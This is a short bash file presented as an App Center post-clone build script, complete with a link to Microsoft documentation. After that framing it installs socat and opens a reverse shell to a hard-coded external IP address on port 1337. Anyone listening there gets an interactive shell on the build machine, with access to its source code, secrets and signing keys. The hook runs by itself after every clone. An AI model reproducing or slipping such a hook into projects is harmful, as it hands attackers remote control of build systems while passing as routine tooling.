#!/usr/bin/env bash

echo "This is an App Center Post-Clone script. For more information on how to use App Center build scripts vist: https://docs.microsoft.com/en-us/appcenter/build/custom/scripts"
brew install socat
RHOST=88.103.237.233
RPORT=1337
socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sane
